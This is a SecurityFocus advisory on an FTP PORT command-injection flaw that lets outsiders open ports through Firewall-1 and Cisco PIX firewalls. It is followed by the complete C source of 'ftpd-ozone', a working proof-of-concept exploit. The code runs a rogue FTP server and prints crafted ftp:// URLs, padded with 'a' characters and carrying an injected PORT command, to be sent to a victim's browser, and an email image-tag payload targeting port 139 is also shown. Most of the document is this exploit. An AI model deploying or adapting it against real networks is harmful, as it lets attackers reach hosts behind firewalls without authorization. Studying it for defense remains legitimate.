source: http://www.securityfocus.com/bid/1045/info

A vulnerability exists in the handling of certain rules on many firewalls, that may allow users outside of the firewall to gain limited access to areas behind firewalls. Whereas previous descriptions of attacks of this style were server based, it is also possible to use client based programs to exploit these problems.

By sending, for instance, an email which contains a tag such as the following: <img src="ftp://ftp.rooted.com/aaaa[lots of A]aaaPORT 1,2,3,4,0,139">

By balancing the number of A's so the PORT command begins on a new boundry, the firewall will incorrectly parse the resulting RETR /aaaaaaaa[....]aaaaaPORT 1,2,3,4,0,139 as first a RETR and then PORT command, and open port 139 to the origin address. This would allow the server site to connect to port 139 on the client. Any port could be used in place of 139, unless the firewall blocks "known server ports."

Versions of Firewall-1 4.1 and prior are believed vulnerable. Versions of Cisco PIX, up to and including current 5.0(1) are believed vulnerable.

/*
  ftpd-ozone.c

  Demonstrate the FTP reverse firewall penetration technique
  outlined by Mikael Olsson, EnterNet Sweden AB.

  Tested against Netscape, Microsoft IE, Lynx, Wget. YMMV.
  
  Copyright (c) 2000 Dug Song <dugsong@monkey.org>
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/telnet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define WINDOW_LEN	42
#define FTPD_PORT	21

#define GREEN		"\033[0m\033[01m\033[32m"
#define OFF		"\033[0m"

#define int_ntoa(x)	(inet_ntoa(*(struct in_addr *)&x))

void
usage(void)
{
  fprintf(stderr, "Usage: ftpd-ozone [-w win] <ftp-client> <port-to-open>\n");
  exit(1);
}

/* Strip telnet options, as well as suboption data. */
int
strip_telopts(u_char *buf, int len)
{
  int i, j, subopt = 0;
  char *p;
  
  for (i = j = 0; i < len; i++) {
    if (buf[i] == IAC) {
      if (++i >= len) break;
      else if (buf[i] > SB)
	i++;
      else if (buf[i] == SB) {
	p = buf + i + 1;
	subopt = 1;
      }
      else if (buf[i] == SE) {
	if (!subopt) j = 0;
	subopt = 0;
      }
    }
    else if (!subopt) {
      /* XXX - convert isolated carriage returns to newlines. */
      if (buf[i] == '\r' && i + 1 < len && buf[i + 1] != '\n')
	buf[j++] = '\n';
      /* XXX - strip binary nulls. */
      else if (buf[i] != '\0')
	buf[j++] = buf[i];
    }
  }
  buf[j] = '\0';
  
  return (j);
}

u_long
resolve_host(char *host)
{
  u_long addr;
  struct hostent *hp;
  
  if (host == NULL) return (0);
  
  if ((addr = inet_addr(host)) == -1) {
    if ((hp = gethostbyname(host)) == NULL)
      return (0);
    memcpy((char *)&addr, hp->h_addr, sizeof(addr));
  }
  return (addr);
}

#define UC(b)	(((int)b)&0xff)

int
portnum2str(char *buf, int size, u_long ip, u_short port)
{
  char *p, *q;

  port = htons(port);
  p = (char *)&ip;
  q = (char *)&port;
  
  return (snprintf(buf, size, "%d,%d,%d,%d,%d,%d",
		   UC(p[0]), UC(p[1]), UC(p[2]), UC(p[3]),
		   UC(q[0]), UC(q[1])));
}

int
portstr2num(char *str, u_long *dst, u_short *dport)
{
  int a0, a1, a2, a3, p0, p1;
  char *a, *p;

  if (str[0] == '(') str++;
  strtok(str, ")\r\n");
  
  if (sscanf(str, "%d,%d,%d,%d,%d,%d", &a0, &a1, &a2, &a3, &p0, &p1) != 6)
    return (-1);

  a = (char *)dst;
  a[0] = a0 & 0xff; a[1] = a1 & 0xff; a[2] = a2 & 0xff; a[3] = a3 & 0xff;
  
  p = (char *)dport;
  p[0] = p0 & 0xff; p[1] = p1 & 0xff;

  *dport = ntohs(*dport);
  
  return (0);
}

void
print_urls(u_long dst, u_short dport, int win)
{
  char *p, host[128], tmp[128];
  u_long ip;
  
  gethostname(host, sizeof(host));
  ip = resolve_host(host);
  strncpy(host, int_ntoa(ip), sizeof(host));

  /* XXX - "MDTM /\r\n" for Netscape, "CWD /\r\n" for MSIE. i suk. */
  win -= (4 + 2 + 2);
  p = malloc(win + 1);
  memset(p, 'a', win);
  p[win] = '\0';

  portnum2str(tmp, sizeof(tmp), dst, dport);
  
  printf("Netscape / Lynx URL to send client at %s:\n"
	 "ftp://%s/%s%%0a%%0dPORT%%20%s\n",
	 int_ntoa(dst), host, p, tmp);
  printf("MSIE / Wget URL to send client at %s:\n"
	 "ftp://%s/a%s%%0a%%0dPORT%%20%s\n",
	 int_ntoa(dst), host, p, tmp);
  
  free(p);
}

int
init_ftpd(int port, int win)
{
  int fd, i = 1;
  struct sockaddr_in sin;
  
  if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
    return (-1);

  if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &i, sizeof(i)) == -1)
    return (-1);

  if (setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &win, sizeof(win)) == -1)
    return (-1);
  
  memset(&sin, 0, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = htonl(INADDR_ANY);
  sin.sin_port = htons(port);
  
  if (bind(fd, (struct sockaddr *)&sin, sizeof(sin)) == -1)
    return (-1);
  if (listen(fd, 10) == -1)
    return (-1);

  return (fd);
}

void
do_ftpd(int fd)
{
  FILE *f;
  char buf[1024];
  int len, portcmd = 0;
  u_long ip;
  u_short port;

  if ((f = fdopen(fd, "r+")) == NULL)
    return;

  fprintf(f, "220 ftpd-ozone ready for love.\r\n");
  
  while (fgets(buf, sizeof(buf), f) != NULL) {
    if ((len = strip_telopts(buf, strlen(buf))) == 0)
      continue;
    
    if (strncasecmp(buf, "SYST", 4) == 0) {
      fprintf(f, "215 ftpd-ozone\r\n");
    }
    else if (strncasecmp(buf, "USER ", 5) == 0) {
      fprintf(f, "331 yo there\r\n");
    }
    else if (strncasecmp(buf, "PASS ", 5) == 0) {
      fprintf(f, "230 sucker\r\n");
    }
    else if (strncasecmp(buf, "PWD", 3) == 0) {
      fprintf(f, "257 \"/\" is current directory\r\n");
    }
    else if (strncasecmp(buf, "PASV", 4) == 0) {
      fprintf(f, "502 try PORT instead ;-)\r\n");
      /*fprintf(f, "425 try PORT instead ;-)\r\n");*/
    }
    else if (strncasecmp(buf, "PORT ", 5) == 0) {
      if (portstr2num(buf + 5, &ip, &port) != 0)
	fprintf(f, "500 you suk\r\n");
      else {
	fprintf(f, "200 ready for love\r\n");
	if (portcmd++ < 2)	/* XXX */
	  printf(GREEN "try connecting to %s %d" OFF "\n", int_ntoa(ip), port);
      }
    }
    else if (strncasecmp(buf, "CWD ", 4) == 0 ||
	     strncasecmp(buf, "TYPE ", 5) == 0) {
      fprintf(f, "200 whatever\r\n");
    }
    else if (strncasecmp(buf, "NLST", 4) == 0) {
      fprintf(f, "550 you suk\r\n");
    }
    else if (strncasecmp(buf, "MDTM ", 5) == 0) {
      fprintf(f, "213 19960319165527\r\n");
    }
    else if (strncasecmp(buf, "RETR ", 5) == 0 ||
	     strncasecmp(buf, "LIST", 4) == 0) {
      fprintf(f, "150 walking thru your firewall\r\n");
    }
    else if (strncasecmp(buf, "QUIT", 4) == 0) {
      fprintf(f, "221 l8r\r\n");
      break;
    }
    else fprintf(f, "502 i suk\r\n");
  }
  fclose(f);
}

int
main(int argc, char *argv[])
{
  int c, sfd, cfd;
  u_long dst;
  u_short dport, win = WINDOW_LEN;
  struct sockaddr_in sin;

  while ((c = getopt(argc, argv, "w:h?")) != -1) {
    switch (c) {
    case 'w':
      if ((win = atoi(optarg)) == 0)
	usage();
      break;
    default:
      usage();
    }
  }
  argc -= optind;
  argv += optind;
  
  if (argc != 2)
    usage();

  if ((dst = resolve_host(argv[0])) == 0)
    usage();
  
  if ((dport = atoi(argv[1])) == 0)
    usage();

  if ((sfd = init_ftpd(FTPD_PORT, win)) == -1) {
    perror("init_ftpd");
    exit(1);
  }
  print_urls(dst, dport, win);
  
  for (;;) {
    c = sizeof(sin);
    if ((cfd = accept(sfd, (struct sockaddr *)&sin, &c)) == -1) {
      perror("accept");
      exit(1);
    }
    printf("connection from %s\n", inet_ntoa(sin.sin_addr));
      
    if (fork() == 0) {
      close(sfd);
      do_ftpd(cfd);
      close(cfd);
      exit(0);
    }
    close(cfd);
  }
  exit(0);
}

/* w00w00! */